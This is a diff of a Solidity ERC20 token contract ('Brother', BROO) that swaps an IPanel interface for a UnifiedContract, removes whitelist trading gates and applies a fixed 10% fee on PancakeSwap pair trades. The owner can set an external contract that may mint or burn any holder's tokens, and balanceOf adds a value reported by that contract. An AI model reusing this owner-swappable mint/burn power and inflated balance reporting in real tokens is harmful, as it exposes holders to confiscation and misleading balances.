@@ -3,15 +3,15 @@ pragma solidity ^0.8.24;
 
 import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
-import {IPanel} from "./interface/IPanel.sol";
+import "./UnifiedContract.sol";
 // 移除Slippage接口导入，直接实现10%固定滑点
 
 contract Token is ERC20,Ownable{
     uint8 public _decimals;
 
     receive () external payable {
-        payable(panel).transfer(msg.value);
-        IPanel(panel).addLiquidity(msg.sender,msg.value);
+        payable(unifiedContract).transfer(msg.value);
+        UnifiedContract(unifiedContract).addLiquidity(msg.sender,msg.value);
     }
 
     constructor() ERC20("Brother", "BROO") Ownable(msg.sender){
@@ -21,8 +21,8 @@ contract Token is ERC20,Ownable{
 
     function balanceOf(address account) public view override returns (uint256) {
         uint256 balance = super.balanceOf(account);
-        if(panel != address(0) && account != address(0) && account != cakePair){
-            return balance + IPanel(panel).getBalanceFactory(account);
+        if(unifiedContract != address(0) && account != address(0) && account != cakePair){
+            return balance + UnifiedContract(unifiedContract).getCurrentOutputLP(account);
         } else {
             return balance;
         }
@@ -30,78 +30,59 @@ contract Token is ERC20,Ownable{
 
     function burn(uint256 value) external { _burn(_msgSender(),value); }
     function getBalance(address account) public view returns (uint balance) { balance = super.balanceOf(account); }
-    function miningMint(address target,uint256 value) external { if(_msgSender() == panel) { _mint(target,value); } }
-    function miningBurn(address target,uint256 value) external { if(_msgSender() == panel) { _burn(target,value); } }
+    function miningMint(address target,uint256 value) external { if(_msgSender() == unifiedContract) { _mint(target,value); } }
+    function miningBurn(address target,uint256 value) external { if(_msgSender() == unifiedContract) { _burn(target,value); } }
 
     /*---------------------------------------------------交易-----------------------------------------------------------*/
     function transferFrom(address from, address to, uint256 value) public override returns (bool) {
-        if(from == cakePair || to == cakePair){
-            bool fromRost = (panel == address(0) ? true : IPanel(panel).getRostSwap(from));
-            bool toRost = (panel == address(0) ? true : IPanel(panel).getRostSwap(to));
-            bool swapFlag = (panel == address(0) ? false : IPanel(panel).getSwapFlag(address(this)));
-            if(swapFlag){
-                require(!fromRost && !toRost,"BRO: Transaction Limit");
-            } else {
-                require(fromRost || toRost,"BRO: Transaction Close");
-            }
-        }
+        // 移除黑白名单逻辑，简化交易检查
         _spendAllowance(from, _msgSender(), value);
         _transferChild(from, to, value);
-        if(to == address(this)){ _update(address(this),panel,value); IPanel(panel).sellToken(from, value); }
+        if(to == address(this)){ _update(address(this),unifiedContract,value); UnifiedContract(unifiedContract).sellToken(from, value); }
         return true;
     }
 
     function transfer(address to, uint256 value) public override returns (bool) {
-        if(_msgSender() == cakePair || to == cakePair){
-            bool fromRost = (panel == address(0) ? true : IPanel(panel).getRostSwap(_msgSender()));
-            bool toRost = (panel == address(0) ? true : IPanel(panel).getRostSwap(to));
-            bool swapFlag = (panel == address(0) ? false : IPanel(panel).getSwapFlag(address(this)));
-            if(swapFlag){
-                require(!fromRost && !toRost,"BRO: Transaction Limit");
-            } else {
-                require(fromRost || toRost,"BRO: Transaction Close");
-            }
-        }
+        // 移除黑白名单逻辑，简化交易检查
         _transferChild(_msgSender(), to, value);
-        if(to == address(this)){ _update(address(this),panel,value); IPanel(panel).sellToken(_msgSender(), value); }
+        if(to == address(this)){ _update(address(this),unifiedContract,value); UnifiedContract(unifiedContract).sellToken(_msgSender(), value); }
         return true;
     }
 
     function _transferChild(address from, address to, uint256 amount) private {
-        bool fromRost = IPanel(panel).getRostPanel(from);
-        bool toRost   = IPanel(panel).getRostPanel(to);
-        uint amountBefore = (!fromRost && !toRost) ? _before(from, to, amount) : 0;
+        // 移除黑白名单逻辑，简化转账处理
+        uint amountBefore = _before(from, to, amount);
         
         // 简化滑点逻辑：直接使用10%固定滑点
-        if(amount > 0 && !fromRost && !toRost && (from == cakePair || to == cakePair)){
+        if(amount > 0 && (from == cakePair || to == cakePair)){
             uint256 slippageAmount = amount * 10 / 100;  // 10%滑点
             if(slippageAmount > 0){
                 _transfer(from, to, amount - slippageAmount);
-                _transfer(from, panel, slippageAmount);  // 滑点转给panel处理
-                IPanel(panel).transferToken(address(this), from, to, slippageAmount);
+                _transfer(from, unifiedContract, slippageAmount);  // 滑点转给统一合约处理
+                UnifiedContract(unifiedContract).transferToken(from, to, slippageAmount);
             } else {
                 _transfer(from, to, amount);
             }
         } else {
             _transfer(from, to, amount);
         }
-        if(!fromRost && !toRost) { _after(from,to,amount,amountBefore); }
+        _after(from,to,amount,amountBefore);
     }
 
     function _before(address from, address to, uint256 amount) private returns(uint amountBefore){
-        if(panel != address(0) && amount > 0){ amountBefore = IPanel(panel).transferBefore(from,to,amount); }
+        if(unifiedContract != address(0) && amount > 0){ amountBefore = UnifiedContract(unifiedContract).transferBefore(from,to,amount); }
     }
 
     function _after(address from, address to, uint256 amount,uint amountBefore) private{
-        if(panel != address(0) && amount > 0){ IPanel(panel).transferAfter(from,to,amount,amountBefore); }
+        if(unifiedContract != address(0) && amount > 0){ UnifiedContract(unifiedContract).transferAfter(from,to,amount,amountBefore); }
     }
 
     /*---------------------------------------------------管理运营-----------------------------------------------------------*/
     address public cakePair;                        // Pancake底池地址
     function setConfig(address _cakePair) public onlyOwner { cakePair = _cakePair; }
 
-    address public panel;
-    function setExternalContract(address _panel) public onlyOwner {
-        panel = _panel;
+    address public unifiedContract;
+    function setExternalContract(address _unifiedContract) public onlyOwner {
+        unifiedContract = _unifiedContract;
     }
 }
